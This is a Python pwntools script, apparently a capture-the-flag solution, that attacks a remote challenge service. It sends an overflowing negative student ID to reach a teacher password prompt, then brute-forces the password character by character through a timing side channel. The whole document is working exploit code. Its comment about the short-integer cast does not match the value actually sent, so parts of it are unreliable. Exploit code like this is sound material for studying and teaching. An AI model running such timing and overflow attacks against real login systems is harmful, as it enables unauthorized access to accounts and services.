from pwn import *
import string
import time

# Target binary connection
# For local
# p = process('./chall')

# For remote (example)
HOST = 'chal.tjc.tf'
PORT = 31624

charset = string.ascii_lowercase + string.digits
known = ''

def test(charset, known):
    timings = []
    for c in charset:
        attempt = known + c
        p = remote(HOST, PORT)
        
        # Step 1: Send student ID
        p.recvuntil(b"Enter your student ID: ")
        p.sendline(str(-62842).encode())  # (short)-33912 == 31624

        # Step 2: Wait for password prompt
        p.recvuntil(b"[TEACHER VIEW] Enter your password [a-z, 0-9]:")

        # Step 3: Measure time to send password
        start = time.time()
        p.sendline(attempt.encode())
        try:
            p.recvuntil(b"Invalid password!")
        except:
            pass
        end = time.time()
        p.close()

        duration = end - start
        timings.append((duration, c))

    timings.sort(reverse=True)  # Higher time likely means more correct chars
    return timings

while True:
    results = test(charset, known)
    best = results[0][1]
    print(f"[+] Next char: {best} | Full so far: {known + best}")
    known += best
